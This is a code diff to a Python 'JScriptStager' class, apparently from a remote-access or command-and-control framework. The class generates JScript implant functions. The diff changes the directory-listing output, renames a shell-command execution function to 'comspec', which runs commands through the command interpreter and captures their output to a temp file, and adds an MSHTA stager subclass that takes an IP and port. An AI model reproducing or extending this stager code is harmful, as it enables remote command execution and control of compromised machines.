@@ -80,7 +80,7 @@ class JScriptStager(Stager):
           ''' while(enumerator.atEnd() == false){{ '''
            ''' var file = enumerator.item(); '''
            ''' try {{ '''
-            ''' results = results + file.datecreated + '\\t<' + file.type.toUpperCase() + '>\\t(' + (file.size/1000000).toFixed(3) + ' MB)\\t' + file.name + '\\n'; '''
+            ''' results = results + file.datecreated + '\\t<' + file.type.toUpperCase().slice(0,13) + '>\\t(' + (file.size/1000000).toFixed(3) + ' MB)\\t' + file.name + '\\n'; '''
            ''' }} catch (e) {{ '''
             ''' results = results; '''
            ''' }} '''
@@ -92,7 +92,7 @@ class JScriptStager(Stager):
           ''' while(enumerator.atEnd() == false){{ '''
            ''' var sub_folder = enumerator.item(); '''
            ''' try {{ '''
-            ''' results = results + sub_folder.datecreated + '\\t<' + sub_folder.type.toUpperCase() + '>\\t(' + (sub_folder.size/1000000).toFixed(3) + ' MB)\\t' + sub_folder.name + '\\n'; '''
+            ''' results = results + sub_folder.datecreated + '\\t<' + sub_folder.type.toUpperCase().slice(0,13) + '>\\t(' + (sub_folder.size/1000000).toFixed(3) + ' MB)\\t' + sub_folder.name + '\\n'; '''
            ''' }} catch (e) {{ '''
             ''' results = results; '''
            ''' }} '''
@@ -212,11 +212,11 @@ class JScriptStager(Stager):
         '''}}''').format(self.variables['file-system-object'][0]))
 
         # Command Execution Options
-        self.functions['exec'] = util.Function('exec', 'Executes shell commands', 'Command Execution Options', [self.functions['delfile'], self.functions['download']],
-        (''' function exec(command) {{ '''
-           ''' stdout_path = {1} + '\\{3}.txt'; '''
+        self.functions['comspec'] = util.Function('comspec', 'Executes commands with the command sepecifier.', 'Command Execution Options', [self.functions['delfile'], self.functions['download']],
+        (''' function comspec(command) {{ '''
+           ''' stdout_path = {1} + '\\\{3}.txt'; '''
            ''' if ({2}.FileExists(stdout_path)) {{ '''
-             ''' return 'STDOUT file already exists.'; '''
+             ''' return stdout_path + ' already exists, please remove before running commands.'; '''
            ''' }} '''
            ''' command = {4} + ' /q /c ' + command + ' 1> ' + stdout_path + ' 2>&1'; '''
            ''' try {{ '''
@@ -228,3 +228,10 @@ class JScriptStager(Stager):
              ''' return e.message; '''
            ''' }} '''
         '''}}''').format(self.variables['wscript.shell'][0], self.variables['tmp'][1], self.variables['file-system-object'][0], util.generate_str(), self.variables['compsec'][1]))
+
+class MSHTAStager(JScriptStager):
+
+    format = 'mshta'
+
+    def __init__(self, ip, port):
+        super().__init__(ip, port)
